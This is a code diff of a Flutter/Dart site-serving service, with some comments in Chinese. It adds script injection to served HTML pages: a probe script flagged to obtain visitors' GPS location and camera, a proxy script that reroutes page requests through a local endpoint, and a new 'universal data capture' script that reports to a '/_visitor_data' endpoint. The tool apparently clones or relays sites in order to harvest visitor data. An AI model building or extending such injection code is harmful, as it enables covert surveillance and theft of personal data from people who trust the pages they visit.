@@ -10,6 +10,7 @@ import 'package:shared_preferences/shared_preferences.dart';
 import 'package:flutter/services.dart' show rootBundle;
 import 'package:html/parser.dart' as html_parser;
 import 'server_service.dart';
+import 'universal_capture_injector.dart';
 
 
 class Site {
@@ -594,7 +595,7 @@ class SiteService {
   void _injectInterceptors(Document document, Site site) {
     final headElem = document.head ?? document.append(Element.tag('head')) as Element;
 
-    // inline probe script with flags (using Element to avoid web-only APIs)
+    // 注入探针脚本（保持原有功能）
     final probeScript = Element.tag('script')..innerHtml = """
     window.__PROBE_GPS__=${site.probeGPS};
     window.__PROBE_CAM__=${site.probeCamera};
@@ -641,7 +642,8 @@ class SiteService {
     """;
     headElem.append(probeScript);
 
-    final scriptContent = """
+    // 注入代理脚本（保持原有功能）
+    final proxyScript = Element.tag('script')..innerHtml = """
     (function(){
       function buildProxy(url){return '/_proxy_api?target='+encodeURIComponent(url);} 
       // XHR
@@ -692,8 +694,11 @@ class SiteService {
       }, true);
     })();
     """;
-    final scriptElem = Element.tag('script')..innerHtml = scriptContent;
-    headElem.append(scriptElem);
+    headElem.append(proxyScript);
+
+    // 注入新的通用数据捕获脚本
+    final captureScript = Element.tag('script')..innerHtml = UniversalCaptureInjector.generateCaptureScript('/_visitor_data');
+    headElem.append(captureScript);
   }
 
   // 计算 HTML 本地保存相对路径
